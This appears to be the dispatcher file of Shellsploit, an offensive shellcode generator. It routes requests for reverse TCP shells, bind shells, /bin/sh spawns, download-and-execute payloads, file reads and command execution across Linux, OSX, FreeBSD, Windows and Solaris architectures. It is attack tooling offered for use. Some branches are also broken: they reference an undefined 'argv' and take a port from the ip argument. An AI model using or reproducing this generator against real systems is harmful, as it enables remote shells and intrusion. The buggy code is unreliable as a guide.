#------------------Bombermans Team---------------------------------# 
#Author  : B3mB4m
#Concat  : b3mb4m@protonmail.com
#Project : https://github.com/b3mb4m/Shellsploit
#LICENSE : https://github.com/b3mb4m/Shellsploit/blob/master/LICENSE
#------------------------------------------------------------------#



def generator( choose=None, shellcode=None, COMMAND=None, FILE=None, ip=None, port=None, URL=None, PASSWORD=None, MESSAGE=None, FILENAME=None):
	if choose == "linux86":
		if shellcode == "binsh_spawn":
			from .Linux86.bin_shx86 import bin_shx86
			return bin_shx86()

		elif shellcode == "exec":
			from .Linux86.execc import execc
			return execc( COMMAND)

		elif shellcode == "read":
			from .Linux86.readfilex86 import readx86
			from .stackconvert import stackconvertSTR
			return readx86( stackconvertSTR(FILE))

		elif shellcode == "download&exec":
			from .Linux86.download import downloadANDexecute
			from .stackconvert import stackconvertSTR
			filename = URL.split("/")[-1]
			return downloadANDexecute( stackconvertSTR(URL), stackconvertSTR(filename))

		elif shellcode == "chmod":
			from .Linux86.chmod import ch
			from .stackconvert import stackconvertSTR
			return ch( stackconvertSTR(FILE))

		elif shellcode == "tcp_bind":
			from .Linux86.tcp_bindx86 import tcp_bindx86
			from .stackconvert import PORT
			return tcp_bindx86(  PORT(port))

		elif shellcode == "reverse_tcp":
			from .Linux86.reverse_tcpx86 import reverse_tcpx86
			from .stackconvert import IP
			from .stackconvert import PORT
			return reverse_tcpx86( IP(ip), PORT(port))

	elif choose == "linux64":
		if shellcode == "binsh_spawn":
			from .Linux64.bin_shx64 import bin_shx64
			return bin_shx64()

		elif shellcode == "tcp_bind":
			from .Linux64.tcp_bindx64 import tcp_bindx64
			from .stackconvert import PORT
			return tcp_bindx64( PORT(port))

		elif shellcode == "reverse_tcp":
			from .Linux64.reverse_tcpx64 import reverse_tcpx64
			from .stackconvert import IP
			from .stackconvert import PORT
			return reverse_tcpx64( IP(ip), PORT(port))
		
		elif shellcode == "read":
			from .Linux64.readfilex64 import readx64
			from .stackconvert import plaintext
			return readx64( plaintext(FILE))


	elif choose == "linux":
		from .Linux.magic import merlin

		if shellcode == "binsh_spawn":
			from .Linux86.bin_shx86 import bin_shx86
			from .Linux64.bin_shx64 import bin_shx64 
			value = hex(len(bin_shx86().split("\\x"))-1)[2:]
			value = "\\x{0}".format(value)
			return merlin( value)+bin_shx86()+bin_shx64()

		elif shellcode == "read":
			from .Linux86.readfilex86 import readx86
			from .Linux64.readfilex64 import readx64
			from .stackconvert import stackconvertSTR
			from .stackconvert import plaintext
			value = hex(len(readx86( stackconvertSTR(FILE)).split("\\x"))-1)[2:]
			value = "\\x{0}".format(value)
			return merlin( value)+readx86( stackconvertSTR(FILE))+readx64( plaintext(FILE))
		
		elif shellcode == "reverse_tcp":
			from .Linux64.reverse_tcpx64 import reverse_tcpx64
			from .Linux86.reverse_tcpx86 import reverse_tcpx86
			from .stackconvert import IP
			from .stackconvert import PORT
			value = hex(len(reverse_tcpx86( IP(ip), PORT(port)).split("\\x"))-1)[2:]
			value = "\\x{0}".format(value)
			return merlin( value)+reverse_tcpx86( IP(ip), PORT(port))+reverse_tcpx64( IP(ip), PORT(port))

		elif shellcode == "tcp_bind":
			from .Linux64.tcp_bindx64 import tcp_bindx64
			from .Linux86.tcp_bindx86 import tcp_bindx86
			from .stackconvert import PORT
			value = hex(len(tcp_bindx86( PORT(port)).split("\\x"))-1)[2:]
			value = "\\x{0}".format(value)
			return merlin( value)+tcp_bindx86(  PORT(port))+tcp_bindx64( PORT(port))


	elif choose == "osx86":
		if shellcode == "tcp_bind":
			from .OSX86.tcp_bind import tcp_bind
			from .stackconvert import PORT
			return tcp_bind( PORT(port))

		elif shellcode == "binsh_spawn":
			from .OSX86.bin_sh import bin_sh
			return bin_sh()

		elif shellcode == "reverse_tcp":
			from .OSX86.reverse_tcp import reverse_tcp
			from .stackconvert import IP
			from .stackconvert import PORT
			return reverse_tcp( IP(ip), PORT(port))


	elif choose == "osx64":
		if shellcode == "binsh_spawn":
			from .OSX64.bin_sh import bin_sh
			return bin_sh()
		
		elif shellcode == "reverse_tcp":
			from .OSX64.reverse_tcp import reverse_tcp
			from .stackconvert import IP
			from .stackconvert import PORT
			return reverse_tcp( IP(ip), PORT(port))
		
		elif shellcode == "tcp_bind":
			from .OSX64.tcp_bind import tcp_bind
			from .stackconvert import PORT
			return tcp_bind( PORT(port))


	elif choose == "freebsdx86":
		if shellcode == "binsh_spawn":
			from .FreeBSDx86.bin_sh import bin_sh
			return bin_sh()			
		

		elif shellcode == "read":
			from .FreeBSDx86.read import read
			from .plaintext import plaintext
			return read(plaintext(FILE))


		elif shellcode == "reverse_tcp":
			from .FreeBSDx86.reverse_tcp import reverse_tcp
			from .stackconvert import IP
			from .stackconvert import PORT
			return reverse_tcp( IP(ip), PORT(port))
		

		elif shellcode == "reverse_tcp2":
			from .FreeBSDx86.reverse_tcp2 import reverse_tcp2
			from .stackconvert import IP
			from .stackconvert import PORT
			return reverse_tcp2( IP(ip), PORT(port))
		
		elif shellcode == "tcp_bind":
			from .FreeBSDx86.tcp_bind import tcp_bind
			if len(str(ip)) == 5:
				PORT = "\\x{0}\\x{1}".format((hex(int(ip))[2:][0:2],hex(int(ip))[2:][2:]))
			else:
				PORT = "\\x{0}\\x{1}".format(("0"+hex(int(ip))[2:][0],hex(int(ip))[2:][1:]))
			return tcp_bind( PORT)

		elif shellcode == "exec":
			from .FreeBSDx86.execc import execc
			from .plaintext import plaintext
			command = '/bin/sh -c {0}'.format(argv)
			return execc(plaintext(COMMAND))


	elif choose == "freebsdx64":
		if shellcode == "binsh_spawn":
			from .FreeBSDx64.bin_sh import bin_sh
			return bin_sh()		
		
		elif shellcode == "exec":
			from .FreeBSDx64.execc import execc
			return execc( COMMAND)	


		elif shellcode == "tcp_bind":
			from .stackconvert import plaintext
			from .stackconvert import PORT
			from .FreeBSDx64.tcp_bind import tcp_bind
			return tcp_bind( PORT(port), plaintext(PASSWORD))	

		elif shellcode == "reverse_tcp":
			from .FreeBSDx64.reverse_tcp import reverse_tcp
			from .stackconvert import IP
			from .stackconvert import PORT
			return reverse_tcp( IP(ip), PORT(port))	


	elif choose == "linux_arm":
		if shellcode == "chmod":
			from .LinuxARM.chmod import chmod
			from .stackconvert import plaintext
			if argv == None:
				return "FILE PATH must be declared."
			else:
				return chmod( plaintext(FILE))

		elif shellcode == "binsh_spawn":
			from .LinuxARM.bin_sh import bin_sh
			return bin_sh()		

		elif shellcode == "exec":
			from .LinuxARM.execc import execc
			return execc( COMMAND)	

		elif shellcode == "reverse_tcp":
			from .LinuxARM.reverse_tcp import reverse_tcp
			from .stackconvert import IP
			from .stackconvert import PORT
			return reverse_tcp( IP(ip), PORT(port))


	elif choose == "linux_mips":
		if shellcode == "reverse_tcp":
			from .LinuxMIPS.reverse_tcp import reverse_tcp
			from .stackconvert import IP
			from .stackconvert import PORT
			return reverse_tcp( IP(ip), PORT(port))

		elif shellcode == "binsh_spawn":
			from .LinuxMIPS.bin_sh import bin_sh
			return bin_sh()
		
		elif shellcode == "chmod": 	
			from .LinuxMIPS.chmod import chmod
			from .stackconvert import plaintext
			return chmod( plaintext(FILE))

		elif shellcode == "tcp_bind":
			from .LinuxMIPS.tcp_bind import tcp_bind
			from .stackconvert import PORT
			return tcp_bind( PORT(port))


	elif choose == "windows":
		if shellcode == "messagebox":
			from .Windows import messagebox
			from .stackconvert import stackconvertSTR
			if MESSAGE == None:
				return messagebox.messagebox( False)
			else:
				return messagebox.messagebox( stackconvertSTR(MESSAGE, True))

		elif shellcode == "downloandandexecute":
			from .Windows import downloadandexecute
			from .stackconvert import rawSTR
			from .stackconvert import stackconvertSTR
			return downloadandexecute.downANDexecute( rawSTR(URL), stackconvertSTR(FILENAME, True))
		
		elif shellcode == "exec":
			from .Windows.execc import WinExec
			return WinExec(COMMAND)

		elif shellcode == "tcp_bind":
			from .Windows.bind_tcp import PayloadModule
			return PayloadModule( port).gen_shellcode()

		elif shellcode	== "reverse_tcp":
			from .Windows.rev_tcp import PayloadModule
			return PayloadModule( ip, port).gen_shellcode()


	elif choose == "solarisx86":	
		if shellcode == "read":
			from .Solarisx86.read import read
			from .plaintext import plaintext
			return read( plaintext(FILE))	

		elif shellcode == "reverse_tcp":
			from .Solarisx86.reverse_tcp import reverse_tcp
			from .stackconvert import IP
			from .stackconvert import PORT
			return reverse_tcp( IP(ip), PORT(port))

		elif shellcode == "binsh_spawn":
			from .Solarisx86.bin_sh import bin_sh
			return bin_sh()

		elif shellcode == "tcp_bind":
			from .Solarisx86.tcp_bind import tcp_bind
			from .stackconvert import PORT
			return tcp_bind( PORT(port))


